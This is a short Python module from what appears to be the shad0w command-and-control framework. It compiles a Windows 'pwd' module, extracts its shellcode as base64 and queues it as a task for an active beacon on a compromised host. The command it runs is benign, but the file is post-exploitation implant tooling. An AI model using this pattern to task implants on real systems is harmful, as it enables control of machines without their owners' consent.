# 
# Display the current working directory
#
from lib import buildtools

EXEC_ID = 0x3000

def main(shad0w, args):

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/pwd/", builddir="/root/shad0w/modules/windows/pwd/build")
    
    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/pwd/build", modlocation="/root/shad0w/modules/windows/pwd/module.exe")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/pwd/module.exe", want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)